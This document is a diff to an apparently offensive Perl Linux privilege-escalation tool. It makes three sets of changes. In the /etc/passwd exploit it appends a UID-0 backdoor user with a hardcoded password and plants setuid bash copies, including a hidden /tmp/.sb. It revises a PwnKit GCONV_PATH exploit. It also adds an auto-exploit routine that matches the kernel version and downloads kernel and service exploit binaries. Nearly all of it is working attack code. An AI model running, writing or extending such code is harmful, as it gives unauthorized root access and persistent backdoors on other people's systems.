@@ -151,32 +151,37 @@ sub exploit_passwd {
     return 0 unless file_writable("/etc/passwd");
     print "${G}[+] /etc/passwd is writable!${Z}\n";
 
-    # Method 1: remove root password
-    my $content = "";
-    if (open(my $rf, '<', '/etc/passwd')) {
-        local $/; $content = <$rf>; close $rf;
-    }
-    $content =~ s/^root:x:/root::/m;
-    if (open(my $wf, '>', '/etc/passwd')) {
-        print $wf $content; close $wf;
-        print "${G}[+] Root password removed${Z}\n";
-    }
+    my $hash = crypt("ganteng123", "\$6\$" . join('', map { chr(97+rand(26)) } 1..8));
+    my $user = "coup";
+    my $entry = "$user:$hash:0:0:root:/root:/bin/bash\n";
 
-    # Method 2: su via python3 pty (bypasses TTY requirement)
+    open(my $pf, '>>', '/etc/passwd') or return 0;
+    print $pf $entry;
+    close $pf;
+    print "${G}[+] Added $user (UID 0, pass: ganteng123)${Z}\n";
+
+    # Try su via python3 pty
     if (find_binary("python3")) {
-        system(q{python3 -c '
+        system(qq{python3 -c '
 import pty, os
 pid = os.fork()
 if pid == 0:
-    pty.spawn(["/bin/su", "-c", "chmod +s /bin/bash; chmod +s /bin/bash"])
+    try:
+        pty.spawn(["/bin/su", "$user", "-c", "chmod +s /bin/bash; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb"])
+    except:
+        pass
+    os._exit(0)
 else:
     os.waitpid(pid, 0)
 ' 2>/dev/null});
-    } else {
-        system("echo '' | su -c 'chmod +s /bin/bash' 2>/dev/null");
-        system("script -qc 'su -c \"chmod +s /bin/bash\"' /dev/null 2>/dev/null");
     }
 
+    # Try ssh localhost
+    if (find_binary("ssh")) {
+        system(qq{ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes $user\@localhost 'chmod +s /bin/bash' 2>/dev/null});
+    }
+
+    # Try compiling a suid helper via PAM modules
     try_suid_bash();
     return 1;
 }
@@ -256,20 +261,21 @@ sub exploit_pwnkit {
     mkdir $tmp;
 
     my $gconv_dir = "$tmp/GCONV_PATH=.";
+    mkdir $gconv_dir;
     mkdir "$gconv_dir/pwnkit";
 
-    open(my $f, '>', "$gconv_dir/pwnkit");
-    print $f "#!/bin/sh\nchmod +s /bin/bash\n";
-    close $f;
+    open(my $fh1, '>', "$gconv_dir/pwnkit") or return 0;
+    print $fh1 "#!/bin/sh\nchmod +s /bin/bash\n";
+    close $fh1;
     chmod 0755, "$gconv_dir/pwnkit";
 
     mkdir "$tmp/pwnkit";
-    open($f, '>', "$tmp/pwnkit/gconv-modules");
-    print $f "module UTF-8// PWNKIT// pwnkit 2\n";
-    close $f;
+    open(my $fh2, '>', "$tmp/pwnkit/gconv-modules") or return 0;
+    print $fh2 "module UTF-8// PWNKIT// pwnkit 2\n";
+    close $fh2;
 
-    open($f, '>', "$tmp/pwnkit/pwnkit.c");
-    print $f q{
+    open(my $fh3, '>', "$tmp/pwnkit/pwnkit.c") or return 0;
+    print $fh3 q{
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -281,7 +287,7 @@ void gconv_init(void *step) {
     _exit(0);
 }
     };
-    close $f;
+    close $fh3;
 
     sys_cmd("gcc -shared -fPIC -o $tmp/pwnkit/pwnkit.so $tmp/pwnkit/pwnkit.c 2>/dev/null");
 
@@ -466,23 +472,45 @@ sub auto_exploit_binary {
     my ($maj,$min,$pat) = $kern =~ /^(\d+)\.(\d+)(?:\.(\d+))?/ or return 0;
     $pat ||= 0;
 
-    my @targets;
+    # All exploits ordered by priority, with kernel range check
+    my @all = (
+        # 2026 CVEs - broad kernel coverage
+        {bin=>"copyfail-go-static",         lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"dirtyfrag-static",           lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"fragnesia-static",           lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"fragnesia2-static",          lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"dirtydecrypt-static",        lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"pintheft-static",            lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"cifswitch-static",           lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"pidfd-race-static",          lo=>[5,0,0],  hi=>[7,1,99]},
+        {bin=>"packet-edit-meme-static",    lo=>[5,18,0], hi=>[7,1,99]},
+        {bin=>"dirtyclone-static",          lo=>[7,0,0],  hi=>[7,1,99]},
+        {bin=>"bad-epoll-static",           lo=>[6,12,0], hi=>[6,12,99]},
+        {bin=>"fuse-oob-static",            lo=>[6,15,0], hi=>[99,0,0]},
+        {bin=>"ipv6-frag-escape-static",    lo=>[6,12,0], hi=>[6,12,99]},
+        # 2022-2024 CVEs
+        {bin=>"dirtypipe-static",           lo=>[5,8,0],  hi=>[5,16,11]},
+        {bin=>"nft-uaf-static",             lo=>[5,0,0],  hi=>[6,99,0]},
+        {bin=>"nft-uaf2-static",            lo=>[5,0,0],  hi=>[5,18,0]},
+        {bin=>"netfilter-oob-static",       lo=>[2,6,19], hi=>[5,12,0]},
+        # 2021 CVEs
+        {bin=>"overlayfs-static",           lo=>[3,0,0],  hi=>[5,11,0]},
+        {bin=>"ovfs-fuse-static",           lo=>[5,11,0], hi=>[99,0,0]},
+        # Services
+        {bin=>"pwnkit-new-static",          lo=>[0,0,0],  hi=>[99,0,0]},
+        {bin=>"pack2theroot-static",        lo=>[0,0,0],  hi=>[99,0,0]},
+        {bin=>"polkit-dbus-static",         lo=>[0,0,0],  hi=>[99,0,0]},
+        {bin=>"docker-sock-static",         lo=>[0,0,0],  hi=>[99,0,0]},
+    );
 
-    if ($maj == 5 && $min >= 8 && ($min < 16 || ($min == 16 && $pat <= 11))) {
-        push @targets, "dirtypipe-static";  # CVE-2022-0847
-    }
-    if ($maj == 5 || ($maj == 6 && $min < 99)) {
-        push @targets, "copyfail-go-static", "dirtyfrag-static", "fragnesia-static",
-                        "dirtydecrypt-static", "pintheft-static";
-    }
-    if ($maj == 5 && $min >= 18) {
-        push @targets, "packet-edit-meme-static";
-    }
-    push @targets, "pwnkit-new-static";
-    push @targets, "nft-uaf-static", "nft-uaf2-static" if $maj <= 6;
-
-    for my $bin (@targets) {
-        return 1 if download_binary($bin);
+    for my $e (@all) {
+        my ($lo_m,$lo_i,$lo_p) = @{$e->{lo}};
+        my ($hi_m,$hi_i,$hi_p) = @{$e->{hi}};
+        my $vk = $maj*10000 + $min*100 + $pat;
+        my $vlo = $lo_m*10000 + $lo_i*100 + $lo_p;
+        my $vhi = $hi_m*10000 + $hi_i*100 + $hi_p;
+        next unless ($vk >= $vlo && $vk <= $vhi);
+        return 1 if download_binary($e->{bin});
     }
     return 0;
 }
